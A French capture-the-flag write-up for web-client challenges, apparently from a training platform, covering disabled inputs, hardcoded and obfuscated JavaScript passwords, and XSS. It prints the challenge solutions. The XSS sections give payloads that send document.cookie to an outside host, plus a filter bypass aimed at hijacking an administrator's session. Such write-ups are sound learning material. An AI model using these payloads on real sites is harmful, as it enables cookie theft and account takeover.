# Challenge web client

## HTML - boutons désactivés

Réactiver les inputs HTML en enlevant le paramètre disable.

```html
[...]
<input _disable type="text" name="auth-login" value="" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGP6zwAAAgcBApocMXEAAAAASUVORK5CYII=&quot;);">
<input _disable type="submit" value="Member access" name="authbutton">
[...]
```

Et accéder à la page suivante.

```html
[...]
Member access granted! The validation password is HTMLCantStopYou
[...]
```

## Javascript - Authentification

Le mot de passe est présent en clair dans le code:

```Javascript
[...]
if (pseudo=="4dm1n" && password=="sh.org") {
[...]
```

## Javascript - Source

Le mot de passe est présent en clair dans le code:

```Javascript
[...]
if ( pass == "123456azerty" ) {
[...]
```

## Javascript - Authentification 2

Le mot de passe est present en clair dans le code:

```Javascript
[...]
var TheLists = ["GOD:HIDDEN"];
[...]
var TheSplit = TheLists[i].split(":");
var TheUsername = TheSplit[0];
var ThePassword = TheSplit[1];
[...]
```

## Javascript - Obfuscation 1

Le mot de passe est présent dans le code et peut être obtenu avec "unescape" qui permet de passer d'un format HTML entities à un format UTf-8.

```Javascript
[...]
pass = '%63%70%61%73%62%69%65%6e%64%75%72%70%61%73%73%77%6f%72%64';
h = window.prompt('Entrez le mot de passe / Enter password');
if(h == unescape(pass)) {
[...]
```

## Javascript - Obfuscation 2

Le mot de passe est présent dans le code et peut-être obtenu par l'évaluation du code en string.

```Javascript
console.log(eval(eval(unescape("unescape%28%22String.fromCharCode%2528104%252C68%252C117%252C102%252C106%252C100%252C107%252C105%252C49%252C53%252C54%2529%22%29"))));
```

## XSS - Stockée 1

Le champ texte est vulnérable à des injections de balise HTML et permet ainsi l'injection de code Javascript.

```Javascript
<script>window.location="http://sandbox-209707.appspot.com/" + document.cookie;</script>
```

## XSS - DOM Based

Sur la page Game une injection script est possible sur les champs nickname et color. En revanche color se peut contenir que 3 caractères et nickname environ 80 caractères. Le mot "location" et les lettres (, ), ", `, ', ;, + et . sont filtrés.
Ainsi nous allons injecter directement dans l'URL les éléments commençant par espace les accolades afin de pouvoir exploiter le 2e champ:

```shell
"/*
```

Puis injecter une redirection vers un serveur:

```Javascript
// Fermer le commentaire ouverte
*/

// Fermer la propriété ouverte
,

// Remettre les champs utilisés par la condition
callbacks: {
    win:this.youwon,
    lose:{
        // Créer une redirection vers un hook avec windows.location
        d: window[
            // Utilisation de RegExr pour contourner le filtrage des strings
            /loc/.source

            // Utilisation de HTML entities pour contourner le filtrage de l'operateur de concatenation
            %2B
            /ation/.source]=/http:\/\/sandbox-209707.appspot.com/.source
    }
}
//
```

Pour enfin en envoyant l'URL par email à l'administrateur pour ensuite récupérer son cookie pour se connecter au compte administrateur.